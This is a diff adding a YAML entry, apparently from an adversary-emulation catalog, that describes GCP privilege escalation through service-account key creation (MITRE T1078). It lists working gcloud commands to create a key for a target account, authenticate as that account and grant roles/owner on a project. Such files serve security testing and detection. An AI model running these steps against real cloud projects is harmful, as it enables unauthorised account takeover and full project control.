@@ -1,0 +1,15 @@
+name: GCP Privilege Escalation via Service Account Key
+description: Creates and uses a service account key to impersonate a higher privilege
+  account.
+mitre_technique: T1078
+stage: Privilege Escalation
+steps:
+- action: gcloud iam service-accounts list
+  description: List available service accounts
+- action: gcloud iam service-accounts keys create sa-key.json --iam-account=<service-account>
+  description: Create a new key for a target service account
+- action: gcloud auth activate-service-account --key-file=sa-key.json
+  description: Authenticate with the new key to impersonate the service account
+- action: gcloud projects add-iam-policy-binding <project-id> --member='serviceAccount:<service-account>'
+    --role='roles/owner'
+  description: Use the new privileges to escalate account permissions
